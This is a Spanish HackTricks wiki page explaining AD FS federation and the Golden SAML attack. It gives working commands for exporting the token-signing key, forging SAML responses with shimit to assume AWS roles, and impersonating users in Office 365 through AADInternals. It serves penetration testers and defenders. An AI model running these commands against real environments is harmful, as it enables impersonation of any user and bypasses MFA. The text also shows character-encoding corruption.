# Federaci贸n

<details>

<summary><strong>Aprende hacking en AWS desde cero hasta experto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** 隆Consulta los [**PLANES DE SUSCRIPCIN**](https://github.com/sponsors/carlospolop)!
* Obt茅n [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci贸n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **nete al**  [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s铆guenos** en **Twitter**  [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Informaci贸n B谩sica

[Desde la documentaci贸n:](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/whatis-fed)**Federaci贸n** es una colecci贸n de **dominios** que han establecido **confianza**. El nivel de confianza puede variar, pero t铆picamente incluye **autenticaci贸n** y casi siempre incluye **autorizaci贸n**. Una federaci贸n t铆pica puede incluir un **n煤mero de organizaciones** que han establecido **confianza** para **acceso compartido** a un conjunto de recursos.

Puedes **federar tu entorno local** con Azure AD y utilizar esta federaci贸n para autenticaci贸n y autorizaci贸n. Este m茅todo de inicio de sesi贸n asegura que toda la **autenticaci贸n de usuarios ocurra en local**. Este m茅todo permite a los administradores implementar niveles m谩s rigurosos de control de acceso. La federaci贸n con **AD FS** y PingFederate est谩 disponible.

<figure><img src="../../../../.gitbook/assets/image (83) (1).png" alt=""><figcaption></figcaption></figure>

B谩sicamente, en la Federaci贸n, toda la **autenticaci贸n** ocurre en el entorno **local** y el usuario experimenta SSO en todos los entornos de confianza. Por lo tanto, los usuarios pueden **acceder a aplicaciones en la nube** utilizando sus **credenciales locales**.

Se utiliza el **Lenguaje de Marcado de Afirmaciones de Seguridad (SAML)** para **intercambiar** toda la informaci贸n de autenticaci贸n y autorizaci贸n entre los proveedores.

En cualquier configuraci贸n de federaci贸n hay tres partes:

* Usuario o Cliente
* Proveedor de Identidad (IdP)
* Proveedor de Servicios (SP)

(Im谩genes de https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps)

<figure><img src="../../../../.gitbook/assets/image (1) (5).png" alt=""><figcaption></figcaption></figure>

1. Inicialmente, una aplicaci贸n (Proveedor de Servicios o SP, como la consola de AWS o el cliente web de vSphere) es accedida por un usuario. Este paso podr铆a ser omitido, llevando al cliente directamente al IdP (Proveedor de Identidad) dependiendo de la implementaci贸n espec铆fica.
2. Posteriormente, el SP identifica el IdP apropiado (por ejemplo, AD FS, Okta) para la autenticaci贸n del usuario. Luego crea una Solicitud de Autenticaci贸n SAML (Security Assertion Markup Language) y redirige al cliente al IdP elegido.
3. El IdP toma el control, autenticando al usuario. Despu茅s de la autenticaci贸n, se formula una Respuesta SAML por el IdP y se reenv铆a al SP a trav茅s del usuario.
4. Finalmente, el SP eval煤a la Respuesta SAML. Si se valida con 茅xito, implicando una relaci贸n de confianza con el IdP, se concede acceso al usuario. Esto marca la finalizaci贸n del proceso de inicio de sesi贸n, permitiendo al usuario utilizar el servicio.

**Si quieres aprender m谩s sobre la autenticaci贸n SAML y los ataques comunes ve a:**

{% embed url="https://book.hacktricks.xyz/pentesting-web/saml-attacks" %}

## Pivote

* AD FS es un modelo de identidad basado en afirmaciones.
* "..las afirmaciones son simplemente declaraciones (por ejemplo, nombre, identidad, grupo) hechas sobre usuarios, que se utilizan principalmente para autorizar el acceso a aplicaciones basadas en afirmaciones ubicadas en cualquier lugar de Internet."
* Las afirmaciones para un usuario se escriben dentro de los tokens SAML y luego se firman para proporcionar confidencialidad por el IdP.
* Un usuario es identificado por ImmutableID. Es globalmente 煤nico y se almacena en Azure AD.
* El ImmutableID se almacena en local como ms-DS-ConsistencyGuid para el usuario y/o se puede derivar del GUID del usuario.
* M谩s informaci贸n en [https://learn.microsoft.com/en-us/windows-server/identity/ad-fs/technical-reference/the-role-of-claims](https://learn.microsoft.com/en-us/windows-server/identity/ad-fs/technical-reference/the-role-of-claims)

**Ataque Golden SAML:**

* En ADFS, la Respuesta SAML est谩 firmada por un certificado de firma de tokens.
* 隆Si el certificado se ve comprometido, es posible autenticarse en Azure AD como CUALQUIER usuario sincronizado con Azure AD!
* Al igual que nuestro abuso de PTA, el cambio de contrase帽a para un usuario o MFA no tendr谩 ning煤n efecto porque estamos falsificando la respuesta de autenticaci贸n.
* El certificado se puede extraer del servidor AD FS con privilegios de DA y luego se puede utilizar desde cualquier m谩quina conectada a Internet.
* M谩s informaci贸n en [https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps](https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps)

### Golden SAML

El proceso donde un **Proveedor de Identidad (IdP)** produce una **Respuesta SAML** para autorizar el inicio de sesi贸n del usuario es fundamental. Dependiendo de la implementaci贸n espec铆fica del IdP, la **respuesta** podr铆a estar **firmada** o **encriptada** utilizando la **clave privada del IdP**. Este procedimiento permite al **Proveedor de Servicios (SP)** confirmar la autenticidad de la Respuesta SAML, asegurando que fue emitida por un IdP de confianza.

Se puede establecer un paralelo con el [ataque de ticket dorado](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/golden-ticket), donde la clave que autentica la identidad y permisos del usuario (KRBTGT para tickets dorados, clave privada de firma de tokens para Golden SAML) se puede manipular para **forjar un objeto de autenticaci贸n** (TGT o Respuesta SAML). Esto permite la suplantaci贸n de cualquier usuario, otorgando acceso no autorizado al SP.

Los Golden SAML ofrecen ciertas ventajas:

* Pueden ser **creados de forma remota**, sin necesidad de formar parte del dominio o federaci贸n en cuesti贸n.
* Siguen siendo efectivos incluso con la **Autenticaci贸n de Dos Factores (2FA)** habilitada.
* La **clave privada de firma de tokens no se renueva autom谩ticamente**.
* **Cambiar la contrase帽a de un usuario no invalida** un SAML ya generado.

#### AWS + AD FS + Golden SAML

[Active Directory Federation Services (AD FS)](https://docs.microsoft.com/en-us/previous-versions/windows/server-2008/bb897402\(v=msdn.10\)) es un servicio de Microsoft que facilita el **intercambio seguro de informaci贸n de identidad** entre socios comerciales de confianza (federaci贸n). B谩sicamente permite a un servicio de dominio compartir identidades de usuario con otros proveedores de servicios dentro de una federaci贸n.

Con AWS confiando en el dominio comprometido (en una federaci贸n), esta vulnerabilidad puede ser explotada para potencialmente **adquirir cualquier permiso en el entorno de AWS**. El ataque requiere la **clave privada utilizada para firmar los objetos SAML**, similar a necesitar el KRBTGT en un ataque de ticket dorado. El acceso a la cuenta de usuario de AD FS es suficiente para obtener esta clave privada.

Los requisitos para ejecutar un ataque Golden SAML incluyen:

* **Clave privada de firma de tokens**
* **Certificado p煤blico del IdP**
* **Nombre del IdP**
* **Nombre del rol (rol a asumir)**
* Dominio\nombre de usuario
* Nombre de sesi贸n de rol en AWS
* ID de cuenta de Amazon

_Solo los elementos en negrita son obligatorios. Los dem谩s se pueden completar seg煤n se desee._

Para adquirir la **clave privada**, es necesario acceder a la **cuenta de usuario de AD FS**. Desde all铆, la clave privada se puede **exportar desde el almac茅n personal** utilizando herramientas como [mimikatz](https://github.com/gentilkiwi/mimikatz). Para recopilar la otra informaci贸n requerida, puedes utilizar el complemento Microsoft.Adfs.Powershell de la siguiente manera, asegur谩ndote de haber iniciado sesi贸n como usuario de ADFS:
```powershell
# From an "AD FS" session
# After having exported the key with mimikatz

# ADFS Public Certificate
[System.Convert]::ToBase64String($cer.rawdata)

# IdP Name
(Get-ADFSProperties).Identifier.AbsoluteUri

# Role Name
(Get-ADFSRelyingPartyTrust).IssuanceTransformRule
```
Con toda la informaci贸n, es posible olvidar un SAMLResponse v谩lido como el usuario que deseas suplantar usando [**shimit**](https://github.com/cyberark/shimit)**:**
```bash
# Apply session for AWS cli
python .\shimit.py -idp http://adfs.lab.local/adfs/services/trust -pk key_file -c cert_file -u domain\admin -n admin@domain.com -r ADFS-admin -r ADFS-monitor -id 123456789012
# idp - Identity Provider URL e.g. http://server.domain.com/adfs/services/trust
# pk - Private key file full path (pem format)
# c - Certificate file full path (pem format)
# u - User and domain name e.g. domain\username (use \ or quotes in *nix)
# n - Session name in AWS
# r - Desired roles in AWS. Supports Multiple roles, the first one specified will be assumed.
# id - AWS account id e.g. 123456789012

# Save SAMLResponse to file
python .\shimit.py -idp http://adfs.lab.local/adfs/services/trust -pk key_file -c cert_file -u domain\admin -n admin@domain.com -r ADFS-admin -r ADFS-monitor -id 123456789012 -o saml_response.xml
```
{% endcode %}

<figure><img src="../../../../.gitbook/assets/image (7) (2).png" alt=""><figcaption></figcaption></figure>

### On-prem -> nube
```powershell
# With a domain user you can get the ImmutableID of the target user
[System.Convert]::ToBase64String((Get-ADUser -Identity <username> | select -ExpandProperty ObjectGUID).tobytearray())

# On AD FS server execute as administrator
Get-AdfsProperties | select identifier

# When setting up the AD FS using Azure AD Connect, there is a difference between IssueURI on ADFS server and Azure AD.
# You need to use the one from AzureAD.
# Therefore, check the IssuerURI from Azure AD too (Use MSOL module and need GA privs)
Get-MsolDomainFederationSettings -DomainName deffin.com | select IssuerUri

# Extract the ADFS token signing certificate from the ADFS server using AADInternals
Export-AADIntADFSSigningCertificate

# Impersonate a user to to access cloud apps
Open-AADIntOffice365Portal -ImmutableID v1pOC7Pz8kaT6JWtThJKRQ== -Issuer http://deffin.com/adfs/services/trust -PfxFileName C:\users\adfsadmin\Documents\ADFSSigningCertificate.pfx -Verbose
```
Tambi茅n es posible crear el ImmutableID de usuarios solo en la nube e impersonarlos
```powershell
# Create a realistic ImmutableID and set it for a cloud only user
[System.Convert]::ToBase64String((New-Guid).tobytearray())
Set-AADIntAzureADObject -CloudAnchor "User_19e466c5-d938-1293-5967-c39488bca87e" -SourceAnchor "aodilmsic30fugCUgHxsnK=="

# Extract the ADFS token signing certificate from the ADFS server using AADInternals
Export-AADIntADFSSigningCertificate

# Impersonate the user
Open-AADIntOffice365Portal -ImmutableID "aodilmsic30fugCUgHxsnK==" -Issuer http://deffin.com/adfs/services/trust -PfxFileName C:\users\adfsadmin\Desktop\ADFSSigningCertificate.pfx -Verbose
```
## Referencias

* [https://learn.microsoft.com/en-us/azure/active-directory/hybrid/whatis-fed](https://learn.microsoft.com/en-us/azure/active-directory/hybrid/whatis-fed)
* [https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps](https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps)

<details>

<summary><strong>Aprende a hackear AWS de cero a h茅roe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Experto en Red Team de HackTricks AWS)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF**, consulta los [**PLANES DE SUSCRIPCIN**](https://github.com/sponsors/carlospolop)!
* Obt茅n el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci贸n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **nete al**  [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s铆guenos** en **Twitter**  [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
